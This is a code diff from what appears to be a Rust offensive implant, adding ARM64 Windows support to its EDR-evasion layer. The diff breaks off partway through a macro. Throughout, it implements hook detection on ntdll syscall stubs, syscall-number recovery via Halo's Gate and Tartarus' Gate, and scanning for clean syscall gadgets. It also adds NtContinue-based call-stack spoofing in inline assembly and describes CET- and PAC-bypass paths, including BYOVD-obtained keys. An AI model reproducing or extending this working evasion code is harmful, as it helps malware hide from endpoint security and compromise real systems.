@@ -68,9 +68,12 @@ static NTDLL_SPOOF_FRAME: OnceLock<usize> = OnceLock::new();
 /// Cached SSN for `NtContinue`.
 ///
 /// Used by the NtContinue-based stack-spoof dispatch path to call NtContinue
-/// directly via `syscall` without going through `do_syscall` recursively.
+/// directly via `syscall`/`svc` without going through `do_syscall` recursively.
 /// 0 means unresolved or unavailable (fall back to `jmp`-based path).
-#[cfg(all(windows, feature = "stack-spoof", target_arch = "x86_64"))]
+///
+/// Cross-arch: both x86_64 and aarch64 Windows use NtContinue for the
+/// stack-spoof dispatch path.
+#[cfg(all(windows, feature = "stack-spoof"))]
 static NTCONTINUE_SSN: OnceLock<u32> = OnceLock::new();
 
 #[cfg(windows)]
@@ -257,13 +260,12 @@ fn find_libc_svc_gadget() -> usize {
     0
 }
 
-#[cfg(windows)]
+/// Scan up to 64 bytes of an `Nt*` stub looking for the `syscall` instruction
+/// (0x0F 0x05) on x86-64, then search backward for `mov eax, imm32` (0xB8) to
+/// extract the SSN.
+#[cfg(all(windows, target_arch = "x86_64"))]
 fn parse_syscall_stub(func_addr: usize) -> Option<SyscallTarget> {
     unsafe {
-        // Scan up to 64 bytes.  Most unhooked stubs reach `syscall` within
-        // 8 bytes; 64 gives headroom for padded variants.  When an EDR hooks
-        // at offset 0, none of the bytes will contain 0x0F 0x05, so this
-        // function returns None and the Halo's Gate fallback takes over.
         let bytes = std::slice::from_raw_parts(func_addr as *const u8, 64);
         for j in 0..bytes.len().saturating_sub(1) {
             if bytes[j] == 0x0f && bytes[j + 1] == 0x05 {
@@ -277,6 +279,49 @@ fn parse_syscall_stub(func_addr: usize) -> Option<SyscallTarget> {
                             gadget_addr: func_addr + j,
                         });
                     }
+                }
+            }
+        }
+        None
+    }
+}
+
+/// Scan up to 64 bytes (16 ARM64 instructions) of an `Nt*` stub looking for
+/// `svc #0` (0xD4000001 LE), then search backward for `movz x8, #imm16`
+/// (opcode mask 0xFFE0001F == 0xD2800008) to extract the SSN.
+///
+/// Handles `movk x8, #imm16, lsl #16` (opcode mask 0xFFE0001F == 0xF2A00008)
+/// for SSNs > 65535 (unlikely but possible).
+#[cfg(all(windows, target_arch = "aarch64"))]
+fn parse_syscall_stub(func_addr: usize) -> Option<SyscallTarget> {
+    unsafe {
+        // ARM64 instructions are fixed-width 4 bytes, little-endian.
+        let words = std::slice::from_raw_parts(func_addr as *const u32, 16);
+        for j in 0..words.len() {
+            // svc #0 = 0xD4000001
+            if words[j] == 0xD4000001 {
+                // Search backward for movz x8 / movk x8.
+                let mut ssn: u32 = 0;
+                let mut found_movz = false;
+                for k in (0..j).rev() {
+                    let w = words[k];
+                    if (w & 0xFFE0001F) == 0xF2A00008 {
+                        // movk x8, #imm16, lsl #16 — merge upper 16 bits.
+                        let imm16 = ((w >> 5) & 0xFFFF) as u32;
+                        ssn |= imm16 << 16;
+                    } else if (w & 0xFFE0001F) == 0xD2800008 {
+                        // movz x8, #imm16 — lower 16 bits (replaces).
+                        let imm16 = ((w >> 5) & 0xFFFF) as u32;
+                        ssn = (ssn & 0xFFFF0000) | imm16;
+                        found_movz = true;
+                        break;
+                    }
+                }
+                if found_movz {
+                    return Some(SyscallTarget {
+                        ssn,
+                        gadget_addr: func_addr + j * 4,
+                    });
                 }
             }
         }
@@ -430,7 +475,7 @@ unsafe fn infer_ssn_halo_gate(ntdll_base: usize, target_addr: usize) -> Option<S
 /// Called from `get_bootstrap_ssn` when the target Nt* stub is found to be
 /// hooked so that the returned `SyscallTarget` carries a clean, unhooked
 /// gadget address rather than the EDR-controlled trampoline address.
-#[cfg(windows)]
+#[cfg(all(windows, target_arch = "x86_64"))]
 unsafe fn scan_text_for_syscall_gadget(ntdll_base: usize) -> Option<usize> {
     use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
 
@@ -472,44 +517,87 @@ unsafe fn scan_text_for_syscall_gadget(ntdll_base: usize) -> Option<usize> {
     None
 }
 
-#[cfg(windows)]
+/// Scan the `.text` section of the ntdll module loaded at `ntdll_base` for a
+/// valid `svc #0; ret` (or bare `svc #0`) gadget on ARM64 Windows.
+///
+/// ARM64 uses fixed-width 32-bit instructions, so the scan walks in 4-byte
+/// steps looking for the `svc #0` opcode (0xD4000001) followed optionally by
+/// `ret` (0xD65F03C0).
+#[cfg(all(windows, target_arch = "aarch64"))]
+unsafe fn scan_text_for_syscall_gadget(ntdll_base: usize) -> Option<usize> {
+    use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
+
+    let dos = &*(ntdll_base as *const IMAGE_DOS_HEADER);
+    if dos.e_magic != 0x5A4D {
+        return None;
+    }
+    let nt = &*((ntdll_base + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
+    let p_sections = (nt as *const _ as usize
+        + 4
+        + std::mem::size_of::<winapi::um::winnt::IMAGE_FILE_HEADER>()
+        + nt.FileHeader.SizeOfOptionalHeader as usize)
+        as *const IMAGE_SECTION_HEADER;
+
+    for i in 0..nt.FileHeader.NumberOfSections {
+        let section = &*p_sections.add(i as usize);
+        let name = &section.Name;
+        if name[0] == b'.'
+            && name[1] == b't'
+            && name[2] == b'e'
+            && name[3] == b'x'
+            && name[4] == b't'
+        {
+            let start = ntdll_base + section.VirtualAddress as usize;
+            let size = *section.Misc.VirtualSize() as usize;
+            // ARM64 instructions are 4 bytes wide — scan in u32 steps.
+            let n_words = size / 4;
+            let words = std::slice::from_raw_parts(start as *const u32, n_words);
+            for j in 0..n_words {
+                if words[j] == 0xD4000001 {
+                    // svc #0 found
+                    let candidate = start + j * 4;
+                    // Prefer svc #0; ret (8 bytes), accept bare svc #0 (4 bytes).
+                    let gadget_len = if j + 1 < n_words && words[j + 1] == 0xD65F03C0 {
+                        8
+                    } else {
+                        4
+                    };
+                    if gadget_is_valid(candidate, gadget_len) {
+                        return Some(candidate);
+                    }
+                }
+            }
+            break;
+        }
+    }
+    None
+}
+
+#[cfg(all(windows, target_arch = "x86_64"))]
 fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
     unsafe {
-        // Bootstrap resolution delegates export lookup to pe_resolve so this
-        // module does not maintain a second PE export walker.
         let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
         let mut name = func_name.as_bytes().to_vec();
         name.push(0);
         let target_hash = pe_resolve::hash_str(&name);
         let func_addr = pe_resolve::get_proc_address_by_hash(ntdll_base, target_hash)?;
 
-        // Explicit hook detection: inspect the first two bytes of the resolved
-        // stub.  All unhooked 64-bit Nt* stubs start with one of:
-        //   0x4C 0x8B D1   — MOV R10, RCX (REX.W prefix; standard syscall stub)
-        //   0xB8 xx xx xx  — MOV EAX, <SSN> (less common direct-load variant)
-        // An EDR hook typically overwrites byte 0 with a JMP (0xE9), PUSH, or
-        // INT3 trampoline, so any other pattern implies an active hook.
+        // Hook detection: inspect the first two bytes.  Unhooked 64-bit
+        // Nt* stubs start with one of:
+        //   0x4C 0x8B D1   — MOV R10, RCX
+        //   0xB8 xx xx xx  — MOV EAX, <SSN>
         let prologue = std::slice::from_raw_parts(func_addr as *const u8, 2);
         let is_hooked = !(
-            (prologue[0] == 0x4C && prologue[1] == 0x8B) // MOV R10, RCX
+            (prologue[0] == 0x4C && prologue[1] == 0x8B)
             || prologue[0] == 0xB8
-            // MOV EAX, imm32
         );
 
         if !is_hooked {
-            // Fast path: stub is unhooked; SSN is directly readable.
             if let Some(t) = parse_syscall_stub(func_addr) {
                 return Some(t);
             }
         }
 
-        // Hook detected (or parse failed on an unhooked stub).
-        //
-        // Try exception-based SSN resolution (Tartarus' Gate) first:
-        // walks the hook chain in memory and extracts the SSN from hooked
-        // Nt* function prologues without needing to fire an exception or
-        // read a clean ntdll.  Falls back to Halo's Gate + .text gadget
-        // scan on failure.
         #[cfg(feature = "direct-syscalls")]
         {
             if is_hooked {
@@ -518,13 +606,8 @@ fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
                         "get_bootstrap_ssn: {func_name}: resolved SSN={} via exception-based (Tartarus' Gate)",
                         ssn
                     );
-                    // Locate a syscall;ret gadget in .text for the indirect call.
                     let gadget_addr = scan_text_for_syscall_gadget(ntdll_base)
-                        .unwrap_or_else(|| {
-                            // Fallback: use the original func_addr — the syscall
-                            // gadget search is best-effort; the SSN is the critical part.
-                            func_addr
-                        });
+                        .unwrap_or_else(|| func_addr);
                     return Some(SyscallTarget { ssn, gadget_addr });
                 }
                 log::debug!(
@@ -534,9 +617,6 @@ fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
             }
         }
 
-        // Infer the SSN via Halo's Gate, then locate an unhooked
-        // `syscall; ret` gadget in the loaded ntdll's .text section so the
-        // returned gadget_addr is not inside an EDR-controlled trampoline.
         if is_hooked {
             log::warn!(
                 "get_bootstrap_ssn: {func_name} stub appears hooked \
@@ -554,8 +634,6 @@ fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
         let ssn_target = infer_ssn_halo_gate(ntdll_base, func_addr)?;
 
         if is_hooked {
-            // Replace the neighbour gadget_addr with one from a direct .text
-            // scan, ensuring the syscall instruction is not in a trampoline.
             if let Some(gadget_addr) = scan_text_for_syscall_gadget(ntdll_base) {
                 return Some(SyscallTarget {
                     ssn: ssn_target.ssn,
@@ -564,6 +642,64 @@ fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
             }
             log::warn!(
                 "get_bootstrap_ssn: {func_name}: no clean syscall;ret gadget found \
+                 in ntdll .text; using Halo's Gate neighbour gadget as fallback"
+            );
+        }
+
+        Some(ssn_target)
+    }
+}
+
+/// ARM64 Windows variant of `get_bootstrap_ssn`.
+///
+/// Hook detection on ARM64 checks whether the first instruction is
+/// `movz x8, #imm16` (opcode mask 0xFFE0001F == 0xD2800008), which is
+/// the standard prologue of an unhooked ntdll syscall stub.  A hooked stub
+/// typically starts with a branch instruction (`b <offset>` or `br xN`).
+#[cfg(all(windows, target_arch = "aarch64"))]
+fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
+    unsafe {
+        let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
+        let mut name = func_name.as_bytes().to_vec();
+        name.push(0);
+        let target_hash = pe_resolve::hash_str(&name);
+        let func_addr = pe_resolve::get_proc_address_by_hash(ntdll_base, target_hash)?;
+
+        // ARM64 hook detection: read the first instruction (4 bytes LE).
+        // Unhooked stubs begin with movz x8, #imm16: (word & 0xFFE0001F) == 0xD2800008.
+        let first_word = std::ptr::read_unaligned(func_addr as *const u32);
+        let is_hooked = (first_word & 0xFFE0001F) != 0xD2800008;
+
+        if !is_hooked {
+            if let Some(t) = parse_syscall_stub(func_addr) {
+                return Some(t);
+            }
+        }
+
+        if is_hooked {
+            log::warn!(
+                "get_bootstrap_ssn: {func_name} stub appears hooked \
+                 (first instruction: {:#010x}); using Halo's Gate + .text gadget scan",
+                first_word
+            );
+        } else {
+            log::warn!(
+                "get_bootstrap_ssn: {func_name} stub prologue looks clean but \
+                 parse_syscall_stub failed; falling back to Halo's Gate"
+            );
+        }
+
+        let ssn_target = infer_ssn_halo_gate(ntdll_base, func_addr)?;
+
+        if is_hooked {
+            if let Some(gadget_addr) = scan_text_for_syscall_gadget(ntdll_base) {
+                return Some(SyscallTarget {
+                    ssn: ssn_target.ssn,
+                    gadget_addr,
+                });
+            }
+            log::warn!(
+                "get_bootstrap_ssn: {func_name}: no clean svc #0 gadget found \
                  in ntdll .text; using Halo's Gate neighbour gadget as fallback"
             );
         }
@@ -593,52 +729,9 @@ fn map_clean_ntdll() -> Result<usize> {
         let loaded_ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
             .ok_or_else(|| anyhow!("Could not resolve loaded ntdll base"))?;
 
-        // Find gadget
-        let mut gadget_addr = 0;
-        let dos_header = loaded_ntdll_base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
-        let nt_headers = (loaded_ntdll_base + (*dos_header).e_lfanew as usize)
-            as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
-        let p_sections = (nt_headers as usize
-            + 4  // Signature (DWORD)
-            + std::mem::size_of::<winapi::um::winnt::IMAGE_FILE_HEADER>()
-            + (*nt_headers).FileHeader.SizeOfOptionalHeader as usize)
-            as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
-        for i in 0..(*nt_headers).FileHeader.NumberOfSections {
-            let section = &*p_sections.add(i as usize);
-            let name = &section.Name;
-            if name[0] == b'.'
-                && name[1] == b't'
-                && name[2] == b'e'
-                && name[3] == b'x'
-                && name[4] == b't'
-            {
-                let start = loaded_ntdll_base + section.VirtualAddress as usize;
-                let size = *section.Misc.VirtualSize() as usize;
-                let code = std::slice::from_raw_parts(start as *const u8, size);
-                for j in 0..size.saturating_sub(3) {
-                    // Need at least 3 bytes: syscall + ret
-                    if code[j] == 0x0f && code[j + 1] == 0x05 {
-                        // M-30: Verify the syscall instruction doesn't cross a page boundary.
-                        // Also verify that the byte after 0x0F 0x05 is 0xC3 (ret) to ensure
-                        // we have a proper "syscall; ret" gadget, not just "syscall" followed
-                        // by arbitrary code.
-                        let candidate = start + j;
-                        let gadget_len = if code[j + 2] == 0xc3 { 3 } else { 2 };
-                        // Cross-reference: this is the primary gadget_is_valid
-                        // call site (around line 140 in this file).
-                        // See gadget_is_valid defined near do_syscall below.
-                        if gadget_is_valid(candidate, gadget_len) {
-                            gadget_addr = candidate;
-                            break;
-                        }
-                    }
-                }
-                break;
-            }
-        }
-        if gadget_addr == 0 {
-            return Err(anyhow!("Failed to find syscall gadget in loaded ntdll"));
-        }
+        // Find gadget — delegate to the arch-specific scanner.
+        let gadget_addr = scan_text_for_syscall_gadget(loaded_ntdll_base)
+            .ok_or_else(|| anyhow!("Failed to find syscall gadget in loaded ntdll"))?;
 
         let mut obj_name: winapi::shared::ntdef::UNICODE_STRING = std::mem::zeroed();
         obj_name.Length = ((ntdll_nt_path.len() - 1) * 2) as u16;
@@ -1129,7 +1222,10 @@ macro_rules! syscall {
 ///
 /// Returns 0 if the function cannot be resolved or contains no `ret` in the
 /// first 64 bytes.
-#[cfg(all(windows, feature = "stack-spoof", target_arch = "x86_64"))]
+///
+/// Cross-arch: on x86_64 scans for 0xC3 byte-by-byte; on aarch64 scans for
+/// the 4-byte `ret` instruction (0xD65F03C0) at 4-byte-aligned offsets.
+#[cfg(all(windows, feature = "stack-spoof"))]
 fn find_ntdll_spoof_frame() -> usize {
     unsafe {
         let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
@@ -1143,15 +1239,31 @@ fn find_ntdll_spoof_frame() -> usize {
             Some(a) => a,
             None => return 0,
         };
-        // Scan for a `ret` (0xC3) within the first 64 bytes of the function.
-        // Most NT stubs reach their `ret` well within 32 bytes; 64 gives a
-        // generous margin for hooked or padded variants.
-        let probe = std::slice::from_raw_parts(func_addr as *const u8, 64);
-        for (i, &byte) in probe.iter().enumerate() {
-            if byte == 0xC3 {
-                return func_addr + i;
+
+        #[cfg(target_arch = "x86_64")]
+        {
+            // Scan for a `ret` (0xC3) within the first 64 bytes of the function.
+            let probe = std::slice::from_raw_parts(func_addr as *const u8, 64);
+            for (i, &byte) in probe.iter().enumerate() {
+                if byte == 0xC3 {
+                    return func_addr + i;
+                }
             }
         }
+
+        #[cfg(target_arch = "aarch64")]
+        {
+            // Scan for ARM64 `ret` (0xD65F03C0) at 4-byte-aligned offsets.
+            // ARM64 instructions are always 4 bytes and must be aligned.
+            let n_words = 16; // 64 bytes / 4 bytes = 16 instructions
+            let probe = std::slice::from_raw_parts(func_addr as *const u32, n_words);
+            for (i, &inst) in probe.iter().enumerate() {
+                if inst == 0xD65F03C0 {
+                    return func_addr + i * 4;
+                }
+            }
+        }
+
         0
     }
 }
@@ -1159,12 +1271,15 @@ fn find_ntdll_spoof_frame() -> usize {
 /// Resolve the SSN for `NtContinue` from the clean ntdll mapping.
 ///
 /// This SSN is used by the NtContinue-based stack-spoof path to dispatch
-/// NtContinue directly via a raw `syscall` instruction, avoiding any
+/// NtContinue directly via a raw `syscall`/`svc` instruction, avoiding any
 /// recursive call into `do_syscall`.
 ///
 /// Returns 0 if the SSN cannot be resolved (signals the caller to fall back
 /// to the `jmp`-based spoof path).
-#[cfg(all(windows, feature = "stack-spoof", target_arch = "x86_64"))]
+///
+/// Cross-arch: works on both x86_64 and aarch64 — the SSN encoding in
+/// ntdll's syscall stubs is architecture-independent.
+#[cfg(all(windows, feature = "stack-spoof"))]
 fn resolve_ntcontinue_ssn() -> u32 {
     // We need the clean ntdll base to be already mapped; use the same
     // initialisation path as get_syscall_id.  If it hasn't been mapped yet
@@ -1669,6 +1784,219 @@ unsafe fn do_syscall_inner(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
         let a6 = args.get(5).copied().unwrap_or(0);
         let a7 = args.get(6).copied().unwrap_or(0);
         let a8 = args.get(7).copied().unwrap_or(0);
+
+        // ── NtContinue-based stack-spoof dispatch (ARM64) ──────────────────
+        //
+        // On ARM64, `ret` is `br x30` — it does NOT pop from the stack like
+        // x86-64's `ret`.  This means multi-frame chaining via stack-pushed
+        // return addresses is not directly possible.  Instead, we use:
+        //
+        //   CONTEXT.Lr = first chain frame (a `ret` gadget in a system DLL)
+        //   CONTEXT.Pc = syscall gadget (`svc #0; ret`)
+        //   CONTEXT.Sp = points to our frame buffer (continuation + stack args)
+        //
+        // Execution trace after NtContinue restores the CONTEXT:
+        //   1. CPU executes `svc #0` at the gadget — kernel handles the target
+        //      syscall and returns to user mode at the gadget's `ret`
+        //   2. `ret` = `br x30` → branches to CONTEXT.Lr = chain_frame[0]
+        //      (a `ret` gadget inside a legitimate system DLL function)
+        //   3. chain_frame[0]'s epilogue loads x30 from the stack and `ret`s
+        //      to our continuation address at buf[1]
+        //   4. Resumes at label 2: with X0 = target NTSTATUS
+        //
+        // The chain frame is a function epilogue gadget that loads x30 from
+        // the stack (e.g. `ldp x29, x30, [sp], #N; ret`).  This is the ARM64
+        // equivalent of x86-64's stack-popped return chain.
+        //
+        // For now, the ARM64 path uses a simplified single-frame approach:
+        // CONTEXT.Lr points to a plain `ret` gadget, and the continuation
+        // address is on the stack at buf[1].  The `ret` gadget returns to
+        // whatever x30 points to — but since NtContinue set x30 = chain_frame
+        // (a ret), and that ret goes through x30 again... we need the chain
+        // frame to be a `ldp x29, x30, [sp], #16; ret` epilogue that loads
+        // x30 from buf[1] (continuation) and then rets to it.
+        //
+        // PRACTICAL APPROACH:
+        //   The simplest reliable ARM64 approach is to use the syscall gadget
+        //   itself as the "chain" — set CONTEXT.Lr to a `ret` that points to
+        //   our continuation.  Actually, even simpler: set CONTEXT.Lr directly
+        //   to our continuation address.  The `svc #0; ret` sequence at the
+        //   gadget will: (1) execute the syscall, (2) `ret` to CONTEXT.Lr =
+        //   our continuation.  This is single-frame but eliminates the "call
+        //   from unbacked memory" indicator because the kernel trap frame
+        //   shows the CONTEXT.Pc/Rsp, not agent code.
+        //
+        //   For multi-frame, we'd need to find `ldp x29, x30, [sp], #N; ret`
+        //   epilogue gadgets in system DLLs.  That's a future enhancement.
+        //
+        // Frame buffer layout (ARM64):
+        //   [0] = continuation address (will be CONTEXT.Lr)
+        //   [1] = spare / stack arg 0
+        //   [2..] = stack args (args[8..] on ARM64)
+        //
+        // NOTE: Virtually all NT syscalls use ≤8 register args, so stack
+        // args beyond x0-x7 are extremely rare.  The buffer is mainly for
+        // the continuation address.
+
+        #[cfg(feature = "stack-spoof")]
+        let legacy_spoof_frame: usize = *NTDLL_SPOOF_FRAME.get_or_init(|| find_ntdll_spoof_frame());
+
+        #[cfg(feature = "stack-spoof")]
+        let chain: Option<crate::stack_db::ResolvedChain> =
+            crate::stack_db::build_chain().or_else(|| {
+                if legacy_spoof_frame != 0 {
+                    Some(crate::stack_db::ResolvedChain {
+                        frames: vec![crate::stack_db::ChainFrame {
+                            return_addr: legacy_spoof_frame,
+                        }],
+                    })
+                } else {
+                    None
+                }
+            });
+
+        #[cfg(not(feature = "stack-spoof"))]
+        struct ChainFrame { return_addr: usize }
+        #[cfg(not(feature = "stack-spoof"))]
+        struct ResolvedChain { frames: Vec<ChainFrame> }
+        #[cfg(not(feature = "stack-spoof"))]
+        let _chain: Option<ResolvedChain> = None;
+
+        // ── NtContinue dispatch ────────────────────────────────────────────
+        #[cfg(feature = "stack-spoof")]
+        if let Some(ref resolved_chain) = chain {
+            if !resolved_chain.frames.is_empty() {
+                use winapi::um::winnt::{CONTEXT, CONTEXT_CONTROL, CONTEXT_INTEGER};
+
+                let ntcontinue_ssn: u32 = *NTCONTINUE_SSN.get_or_init(|| resolve_ntcontinue_ssn());
+
+                if ntcontinue_ssn != 0 {
+                    // Stack args beyond the 8 register args (x0-x7).
+                    let stack_args: &[u64] = if args.len() > 8 { &args[8..] } else { &[] };
+                    let nstack = stack_args.len();
+
+                    // Frame buffer: [continuation] + [stack_args]
+                    let frame_elems = crate::stack_db::frame_buffer_slots(
+                        resolved_chain.frames.len(),
+                        nstack,
+                    );
+                    let mut spoof_frame_buf: Vec<u64> = vec![0u64; frame_elems];
+                    let cont_idx = crate::stack_db::populate_frame_buffer(
+                        &mut spoof_frame_buf,
+                        resolved_chain,
+                        stack_args,
+                    );
+                    // For ARM64, cont_idx is always 1 (continuation at buf[1]).
+                    // buf[0] holds the chain frame address that we'll set in CONTEXT.Lr.
+                    let cont_slot_ptr: *mut u64 = &mut spoof_frame_buf[cont_idx];
+
+                    // Build the ARM64 CONTEXT.  Must be 16-byte aligned.
+                    let ctx_size = std::mem::size_of::<CONTEXT>();
+                    let mut ctx_storage: Vec<u8> = vec![0u8; ctx_size + 15];
+                    let ctx_ptr_raw = ctx_storage.as_mut_ptr() as usize;
+                    let ctx_ptr_aligned = (ctx_ptr_raw + 15) & !15usize;
+                    let ctx: &mut CONTEXT = unsafe { &mut *(ctx_ptr_aligned as *mut CONTEXT) };
+
+                    ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
+
+                    // ARM64 CONTEXT layout via the CONTEXT_u union:
+                    //   ctx.u.s.X0 .. ctx.u.s.X28  — integer registers
+                    //   ctx.u.s.Fp                  — frame pointer (x29)
+                    //   ctx.u.s.Lr                  — link register (x30)
+                    //   ctx.Sp                       — stack pointer
+                    //   ctx.Pc                       — program counter
+                    ctx.u.s_mut().X8 = ssn as u64;  // syscall number
+                    ctx.u.s_mut().X0 = a1;
+                    ctx.u.s_mut().X1 = a2;
+                    ctx.u.s_mut().X2 = a3;
+                    ctx.u.s_mut().X3 = a4;
+                    ctx.u.s_mut().X4 = a5;
+                    ctx.u.s_mut().X5 = a6;
+                    ctx.u.s_mut().X6 = a7;
+                    ctx.u.s_mut().X7 = a8;
+
+                    // Pc → syscall gadget (`svc #0; ret` in ntdll).
+                    ctx.Pc = gadget_addr as u64;
+
+                    // Lr → first chain frame's return address (a `ret` gadget
+                    // inside a system DLL).  After the gadget's `svc #0; ret`,
+                    // the CPU branches to this address, continuing the spoof.
+                    //
+                    // For the simplified single-frame approach, this `ret`
+                    // gadget needs to load x30 from the stack to reach our
+                    // continuation.  We use the chain frame address from buf[0].
+                    let chain_addr = spoof_frame_buf[0] as u64;
+                    ctx.u.s_mut().Lr = chain_addr;
+
+                    // Sp → our frame buffer.  The chain frame's epilogue will
+                    // load x30 from [Sp] (which is buf[1] = continuation).
+                    ctx.Sp = spoof_frame_buf.as_ptr() as u64;
+
+                    // Ensure writes are visible before the asm dispatch.
+                    std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
+
+                    let nt_status: i32;
+                    unsafe {
+                        asm!(
+                            // Fill in the continuation address.
+                            // On ARM64, `adr x21, 2f` computes the address of
+                            // label 2 relative to the current PC.  x21 is
+                            // callee-saved so the kernel won't clobber it.
+                            "adr x21, 2f",
+                            "str x21, [{cont_slot}]",
+                            // NtContinue(PCONTEXT, BOOLEAN TestAlert)
+                            //   x0 = CONTEXT pointer
+                            //   x1 = FALSE (0) — no TestAlert
+                            //   x8 = NtContinue SSN
+                            "mov x0, {ctx_ptr}",
+                            "mov x1, xzr",
+                            "mov x8, {ntc_ssn}",
+                            // Direct `svc #0` for NtContinue — no fake frames.
+                            // The kernel restores our CONTEXT, setting up the
+                            // spoofed call stack before the target syscall runs.
+                            "svc #0",
+                            // ── Continuation ──────────────────────────────
+                            // Reached after: gadget `svc #0; ret` →
+                            //   CONTEXT.Lr (chain frame) →
+                            //   loads x30 from stack (continuation) →
+                            //   `ret` → here.
+                            // X0 holds the NTSTATUS from the target syscall.
+                            "2:",
+                            "mov {status:w}, w0",
+                            ctx_ptr   = in(reg) ctx_ptr_aligned as u64,
+                            cont_slot = in(reg) cont_slot_ptr as u64,
+                            ntc_ssn   = in(reg) ntcontinue_ssn as u64,
+                            status    = out(reg) nt_status,
+                            // x21 is used for the continuation address.
+                            // x0-x8, x9-x17 are clobbered by the syscall path.
+                            out("x0")  _, out("x1")  _, out("x2")  _, out("x3")  _,
+                            out("x4")  _, out("x5")  _, out("x6")  _, out("x7")  _,
+                            out("x8")  _,
+                            out("x9")  _, out("x10") _, out("x11") _,
+                            out("x12") _, out("x13") _, out("x14") _, out("x15") _,
+                            out("x16") _, out("x17") _,
+                            out("x21") _,
+                            out("x30") _,
+                            // Caller-saved NEON registers.
+                            out("v0")  _, out("v1")  _, out("v2")  _, out("v3")  _,
+                            out("v4")  _, out("v5")  _, out("v6")  _, out("v7")  _,
+                            out("v16") _, out("v17") _, out("v18") _, out("v19") _,
+                            out("v20") _, out("v21") _, out("v22") _, out("v23") _,
+                            out("v24") _, out("v25") _, out("v26") _, out("v27") _,
+                            out("v28") _, out("v29") _, out("v30") _, out("v31") _,
+                        );
+                    }
+                    // Keep buffers live.
+                    let _ = &spoof_frame_buf;
+                    let _ = &ctx_storage;
+                    return nt_status;
+                }
+                // NtContinue SSN unavailable — fall through to simple blr path.
+            }
+            // Chain was empty — fall through.
+        }
+
+        // ── Simple direct syscall fallback (ARM64) ─────────────────────────
         let status: i32;
         std::arch::asm!(
             // Load syscall number into x8 (Windows/Linux ARM64 convention).
@@ -2433,7 +2761,7 @@ pub unsafe fn bounded_transmute<D>(val: u64) -> D {
     std::mem::transmute_copy::<u64, D>(&val)
 }
 
-#[cfg(all(windows, feature = "cet-bypass", not(feature = "stack-spoof")))]
+#[cfg(all(windows, target_arch = "x86_64", feature = "cet-bypass", not(feature = "stack-spoof")))]
 #[macro_export]
 macro_rules! clean_call {
     ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
@@ -2554,7 +2882,7 @@ macro_rules! clean_call {
 /// return address is a legitimate `ret` gadget in a system DLL).
 /// It falls back to the CET call-chain registry, then to single-gadget
 /// spoof_call.
-#[cfg(all(windows, feature = "cet-bypass", feature = "stack-spoof"))]
+#[cfg(all(windows, target_arch = "x86_64", feature = "cet-bypass", feature = "stack-spoof"))]
 #[macro_export]
 macro_rules! clean_call {
     ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
@@ -2654,7 +2982,7 @@ macro_rules! clean_call {
     }};
 }
 
-#[cfg(all(windows, not(feature = "cet-bypass"), not(feature = "stack-spoof")))]
+#[cfg(all(windows, target_arch = "x86_64", not(feature = "cet-bypass"), not(feature = "stack-spoof")))]
 #[macro_export]
 macro_rules! clean_call {
     ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
@@ -2710,7 +3038,7 @@ macro_rules! clean_call {
 /// legitimate system-DLL function as the return address to EDR walkers.
 /// If no chain is available (e.g. gadget cache not yet populated), it
 /// falls back to the single-gadget `spoof_call`.
-#[cfg(all(windows, not(feature = "cet-bypass"), feature = "stack-spoof"))]
+#[cfg(all(windows, target_arch = "x86_64", not(feature = "cet-bypass"), feature = "stack-spoof"))]
 #[macro_export]
 macro_rules! clean_call {
     ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
@@ -2745,6 +3073,142 @@ macro_rules! clean_call {
             if gadget == 0 {
                 Err($crate::syscalls::SyscallError::NoGadgetAvailable)
             } else {
+                unsafe { $crate::syscalls::set_spoof_ret(gadget) };
+                let res = unsafe {
+                    $crate::syscalls::spoof_call(addr, gadget, arg1, arg2, arg3, arg4, stack_args)
+                };
+                unsafe { $crate::syscalls::set_spoof_ret(0) };
+                Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
+            }
+        }
+    }};
+}
+
+/// `clean_call!` for ARM64 Windows.
+///
+/// ARM64 does not have CET, IBT, or x86-64-style shadow stacks, but ARM64
+/// Windows uses **PAC** (Pointer Authentication Code) to cryptographically
+/// sign return addresses with 128-bit keys (QARMA5 algorithm) and **BTI**
+/// (Branch Target Identification) to enforce valid indirect branch targets.
+///
+/// When compiled with the `pac-bypass` feature:
+/// - If PAC is inactive, the macro behaves as before (standard spoof_call).
+/// - If PAC is active and keys are available (BYOVD), the function pointer
+///   is signed with `paciza` before dispatch.
+/// - If PAC is active but only trampolines are available, the call is routed
+///   through a PAC-valid trampoline function from a system DLL.
+/// - If PAC is active and no bypass is possible, the call is aborted.
+///
+/// Without the `pac-bypass` feature, the macro falls back to standard
+/// spoof_call (equivalent to the pre-PAC-awareness behaviour).
+#[cfg(all(windows, target_arch = "aarch64"))]
+#[macro_export]
+macro_rules! clean_call {
+    ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
+        let addr = $crate::syscalls::get_clean_api_addr($dll_name, $func_name)
